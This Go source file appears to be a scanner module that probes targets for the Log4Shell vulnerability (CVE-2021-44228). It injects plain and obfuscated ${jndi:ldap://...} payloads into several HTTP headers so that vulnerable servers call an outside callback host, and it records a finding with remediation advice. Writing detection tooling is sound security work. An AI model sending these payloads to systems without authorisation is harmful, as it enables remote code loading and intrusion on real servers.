package web

// CVE-2021-44228 Log4Shell: JNDI injection via Log4j2
// Sends JNDI lookup strings in headers that Log4j will evaluate

import (
	"context"
	"fmt"
	"time"

	httpclient "github.com/springhawk/springhawk/internal/http"
	"github.com/springhawk/springhawk/internal/vulns"
	"github.com/springhawk/springhawk/pkg/models"
)

func init() { vulns.RegisterRemote(&Log4Shell{}) }

type Log4Shell struct{}

func (m *Log4Shell) ID() string               { return "CVE-2021-44228" }
func (m *Log4Shell) Name() string             { return "Log4Shell JNDI Injection" }
func (m *Log4Shell) CVSS() float64            { return 10.0 }
func (m *Log4Shell) Severity() models.Severity { return models.SeverityCritical }
func (m *Log4Shell) Tags() []string { return []string{"rce", "log4j", "jndi", "log4shell"} }
func (m *Log4Shell) Requirements() vulns.ModuleRequirements {
	return vulns.ModuleRequirements{RequiresCallback: true}
}
func (m *Log4Shell) Description() string {
	return "Log4j2 evaluates JNDI lookup strings in log messages. Injecting ${jndi:ldap://...} in headers triggers remote class loading."
}

var log4shellHeaders = []string{
	"X-Api-Version", "User-Agent", "X-Forwarded-For", "Referer",
	"X-Real-IP", "Authorization", "Accept-Language", "X-Requested-With",
}

func (m *Log4Shell) Check(ctx context.Context, target *models.Target, client *httpclient.Client) ([]*models.Finding, error) {
	if target.CallbackHost == "" {
		return nil, nil // needs callback to confirm
	}

	payload := fmt.Sprintf("${jndi:ldap://%s/log4shell}", target.CallbackHost)
	obfuscated := fmt.Sprintf("${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://%s/log4shell}", target.CallbackHost)

	headers := make(map[string]string)
	for _, h := range log4shellHeaders {
		headers[h] = payload
	}
	headers["User-Agent"] = obfuscated

	resp, err := client.Get(ctx, target.BaseURL, headers)
	if err != nil {
		return nil, nil
	}

	// We can't confirm without a callback, but we fire and note
	f := &models.Finding{
		ID:          fmt.Sprintf("%s-%d", m.ID(), time.Now().UnixNano()),
		Type:        models.FindingTypeVuln,
		Severity:    m.Severity(),
		CVSS:        m.CVSS(),
		CVEIDs:      []string{"CVE-2021-44228"},
		Title:       "Log4Shell JNDI Injection Probe Sent",
		Description: m.Description(),
		URL:         target.BaseURL,
		Endpoint:    "/",
		Method:      "GET",
		Evidence:    fmt.Sprintf("JNDI payloads injected in %d headers (HTTP %d). Check callback host %s for DNS/LDAP callbacks.", len(headers), resp.StatusCode, target.CallbackHost),
		Payload:     payload,
		Remediation: "Upgrade Log4j2 to 2.17.1+. Set log4j2.formatMsgNoLookups=true. Remove JndiLookup class from classpath.",
		References:  []string{"https://nvd.nist.gov/vuln/detail/CVE-2021-44228", "https://logging.apache.org/log4j/2.x/security.html"},
		Tags:        m.Tags(),
		Timestamp:   time.Now(),
		ModuleID:    m.ID(),
	}
	return []*models.Finding{f}, nil
}

func (m *Log4Shell) Exploit(ctx context.Context, target *models.Target, client *httpclient.Client) ([]*models.Finding, error) {
	return m.Check(ctx, target, client)
}
